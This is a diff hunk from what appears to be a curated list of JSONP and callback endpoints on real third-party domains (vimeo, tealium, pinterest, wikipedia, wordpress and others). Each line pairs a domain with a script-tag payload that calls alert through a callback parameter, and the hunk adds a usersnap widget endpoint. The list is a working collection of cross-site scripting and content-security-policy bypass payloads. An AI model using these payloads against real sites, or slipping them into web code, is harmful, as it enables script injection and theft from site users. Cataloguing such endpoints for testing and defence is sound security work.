@@ -148,6 +148,7 @@ vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=a
 visitor-service.tealiumiq.com	<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>
 visitor.pixplug.in	<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>
 wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
+widget.usersnap.com	<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>
 widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
 wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>
 wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>
